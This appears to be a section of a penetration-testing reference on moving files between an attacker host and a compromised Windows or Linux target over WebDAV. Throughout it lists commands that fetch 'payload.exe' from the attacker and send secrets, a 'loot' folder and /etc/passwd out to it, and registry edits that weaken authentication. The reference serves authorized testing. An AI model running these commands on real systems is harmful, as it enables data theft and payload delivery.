# 04 - WebDAV

> [← README](../../README.md) · [Next section →](05-ftp.md)

WebDAV is useful when SMB is blocked but an HTTP port is open: Windows can mount WebDAV as a network drive. Two-way exchange (download + upload) through a single server.

> **Moved to other files:** SMB - [03-smb.md](03-smb.md), FTP - [05-ftp.md](05-ftp.md), HTTP upload - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md).

---

## Navigation

|  |  |
|---|---|
| [1.💻Attacker - stand up a WebDAV server (LHOST)](#1attacker---stand-up-a-webdav-server-lhost) | [2.🪟Windows target ↔ Attacker (everything on RHOST)](#2windows-target--attacker-everything-on-rhost) |
| [3.🐧Linux target ↔ Attacker (everything on RHOST)](#3linux-target--attacker-everything-on-rhost) | [4. Diagnostics](#4-diagnostics) |

---

## 1.💻Attacker - stand up a WebDAV server (LHOST)

### wsgidav (Python)

**Create a venv and install:**
```bash
python3 -m venv /tmp/webdav-venv && source /tmp/webdav-venv/bin/activate && pip install wsgidav cheroot
```

**Directory for the files:**
```bash
mkdir -p /tmp/share
```

**Launch (anonymous access, port 80 - needs `sudo`):**
```bash
sudo /tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=anonymous
```

**Launch on the unprivileged port 8080 (no `sudo`):**
```bash
/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port=8080 --root=/tmp/share --auth=anonymous
```

**Authenticate against Linux system users (`pam-login`):**
```bash
/tmp/webdav-venv/bin/pip install 'wsgidav[pam]'
sudo /tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=pam-login
```

> You can't set arbitrary credentials through the wsgidav CLI - that needs a config file. If you just want a simple `user:pass`, `rclone` is easier (below).

### rclone serve webdav - simpler, with a username/password

**Install:**
```bash
sudo apt install -y rclone
```

**Launch with a username/password on port 80:**
```bash
sudo rclone serve webdav /tmp/share --addr :80 --user test --pass test
```

**Read-only (the target can't write anything):**
```bash
sudo rclone serve webdav /tmp/share --addr :80 --user test --pass test --read-only
```

**Over TLS (`--cert` is the cert+CA in one file, `--key` is the private key):**
```bash
sudo rclone serve webdav /tmp/share --addr :443 --user test --pass test --cert server.pem --key server.key
```

### dufs - a single binary, WebDAV out of the box

**Install (Rust):**
```bash
cargo install dufs
```

**Launch with upload/delete allowed on port 80:**
```bash
sudo dufs -A -b 0.0.0.0 -p 80 /tmp/share
```

**With a username/password:**
```bash
sudo dufs -a 'admin:123@/:rw' -b 0.0.0.0 -p 80 /tmp/share
```

**With TLS:**
```bash
sudo dufs --tls-cert server.pem --tls-key server.key -b 0.0.0.0 -p 443 /tmp/share
```

### wsgidav in Docker

**Run the ready-made image:**
```bash
docker run --rm -it -p 8080:8080 -v /tmp/share:/var/wsgidav-root mar10/wsgidav
```

---

## 2.🪟Windows target ↔ Attacker (everything on RHOST)

### Enable the WebClient service

Without it, Windows can't talk to WebDAV.

**Check the service status:**
```cmd
sc query WebClient
```

**Enable automatic startup:**
```cmd
sc config WebClient start= auto
```

**Start it:**
```cmd
net start WebClient
```

> If `sc query` says "The specified service does not exist as an installed service", the component is missing (stripped-down build).

### Registry: basic auth over HTTP and the size limit

By default Windows allows basic auth only over HTTPS and caps files at ~50 MB.

**Allow basic auth over HTTP too (value 2):**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters /v BasicAuthLevel /t REG_DWORD /d 2 /f
```

**Raise the file size limit to the maximum:**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters /v FileSizeLimitInBytes /t REG_DWORD /d 4294967295 /f
```

**Restart WebClient for it to take effect:**
```cmd
net stop WebClient && net start WebClient
```

### Quick access

**Browser:**
```text
http://LHOST:80/
```

**Explorer - UNC path (`@80` = port):**
```text
\\LHOST@80\DavWWWRoot\
```

### Download (target receives the file)

**CMD - mount WebDAV as a drive:**
```cmd
net use I: http://%LHOST%/
```

**CMD - copy from the drive:**
```cmd
copy I:\payload.exe C:\Users\%USERNAME%\Downloads\
```

**CMD - with a username/password:**
```cmd
net use I: http://%LHOST%/ /user:test test
```

**CMD - straight over UNC, no mounting:**
```cmd
copy \\%LHOST%@80\DavWWWRoot\payload.exe C:\Users\Public\
```

**curl.exe - download over HTTP:**
```cmd
curl.exe http://%LHOST%/payload.exe -o C:\Users\Public\payload.exe
```

**PowerShell - Copy-Item over UNC:**
```powershell
Copy-Item -Path "\\$LHOST@80\DavWWWRoot\payload.exe" -Destination "C:\Users\$env:USERNAME\Downloads\"
```

### Upload (target sends the file)

**CMD - copy to the mounted drive:**
```cmd
copy C:\Users\Public\secrets.txt I:\
```

**CMD - straight over UNC:**
```cmd
copy C:\Users\Public\secrets.txt \\%LHOST%@80\DavWWWRoot\
```

**CMD - into a subfolder (create the folder beforehand):**
```cmd
copy C:\Users\Public\secrets.txt \\%LHOST%@80\DavWWWRoot\loot\
```

**curl.exe - PUT upload:**
```cmd
curl.exe -T C:\Users\Public\secrets.txt http://%LHOST%/secrets.txt
```

**curl.exe - create a folder on the server (MKCOL):**
```cmd
curl.exe -X MKCOL http://%LHOST%/loot
```

**robocopy - upload a whole folder (over UNC):**
```cmd
robocopy C:\Users\Public\secrets \\%LHOST%@80\DavWWWRoot\loot /E
```

### Clean up afterwards

**Unmount the drive:**
```cmd
net use I: /delete
```

**Stop the service (put it back as it was):**
```cmd
net stop WebClient
```

---

## 3.🐧Linux target ↔ Attacker (everything on RHOST)

**Browser:**
```text
http://$LHOST:80/
```

### davfs2 - mount as a regular filesystem

**Install:**
```bash
sudo apt install -y davfs2
```

**Mount (prompts for credentials interactively):**
```bash
sudo mount -t davfs http://$LHOST /mnt
```

**Mount with a username/password and `noexec`:**
```bash
sudo mount -t davfs http://$LHOST /mnt -o username=test,password=test,noexec
```

**Download a file from the mounted share:**
```bash
cp /mnt/payload.exe .
```

**Upload a file to the share:**
```bash
cp /etc/passwd /mnt/
```

**Unmount:**
```bash
sudo umount /mnt
```

### cadaver - interactive WebDAV client

**Connect:**
```bash
cadaver http://$LHOST
```

**Inside - list files:**
```text
ls
```

**Inside - download a file:**
```text
get payload.exe
```

**Inside - upload a file:**
```text
put /etc/passwd
```

**Inside - create a folder and quit:**
```text
mkcol loot
quit
```

### curl - WebDAV methods without installing anything

**Download a file (GET):**
```bash
curl -O http://$LHOST/payload.exe
```

**Upload a file (PUT):**
```bash
curl -T /etc/passwd http://$LHOST/passwd
```

**Directory listing (PROPFIND, depth 1):**
```bash
curl -X PROPFIND -H "Depth: 1" http://$LHOST/
```

**Create a folder (MKCOL):**
```bash
curl -X MKCOL http://$LHOST/loot
```

**Delete a file (DELETE):**
```bash
curl -X DELETE http://$LHOST/loot/old.txt
```

**With basic auth:**
```bash
curl -u test:test -T /etc/passwd http://$LHOST/passwd
```

---

## 4. Diagnostics

**Port is open:**
```bash
nc -zv $LHOST 80
```

**The server responds and supports WebDAV (look for `DAV:` in the headers):**
```bash
curl -I http://$LHOST/
```

**Contents listing via WebDAV:**
```bash
curl -X PROPFIND -H "Depth: 1" http://$LHOST/
```

**WebClient service on the target:**
```cmd
sc query WebClient
```

> **Common pitfalls:**
>
> - **The `WebClient` service is disabled** by default on Windows - enable it (`sc config WebClient start= auto` + `net start WebClient`), otherwise `net use`/Explorer won't touch WebDAV.
> - **Basic auth is HTTPS-only** by default (`BasicAuthLevel=1`) - for plain HTTP raise it to `2` (see section 2).
> - **~50 MB limit** per file (`FileSizeLimitInBytes`) - raise it to `4294967295`.
> - **Port 80 < 1024** - start the server on LHOST with `sudo`.
> - **A non-standard port in a UNC path** is set with `@`, e.g. `\\LHOST@8080\DavWWWRoot\`.
> - **Self-signed HTTPS** is usually rejected by the Windows WebClient - use HTTP or a proper cert.
> - **`net use` on an `http://` URL** is sometimes finicky: an explicit trailing slash (`http://LHOST/`) and a running WebClient help.
> - **The LHOST firewall** may block inbound 80: `sudo ufw allow 80/tcp`.

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

See the [README](../../README.md#notation-and-variables) for details.

---

[← Back to the reference](../../README.md)
